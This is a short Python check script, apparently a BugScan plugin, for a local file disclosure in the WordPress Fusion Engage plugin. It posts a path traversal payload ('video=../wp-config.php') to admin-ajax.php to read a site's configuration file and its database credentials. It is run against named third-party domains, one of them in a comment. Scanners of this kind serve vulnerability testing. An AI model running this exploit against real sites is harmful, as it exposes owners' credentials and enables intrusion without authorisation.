#!/usr/bin/env python
"""
WordPress Fusion Engage Local File Disclosure
https://www.bugscan.net/#!/x/21614
"""

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-admin/admin-ajax.php'
    postdata = 'action=fe_get_sv_html&video=../wp-config.php'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('-d %s %s' % (postdata,url))
    if code == 200 and 'The base configurations of the WordPress' in res:
    # wp-config.php contain the words 
    #"The base configurations of the WordPress"
        security_warning(url + '|POST：' + postdata)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://ededitor.pinedev.in.ua/')[1])
#    audit(assign('wordpress', 'http://greatinfo.me/')[1]) # another example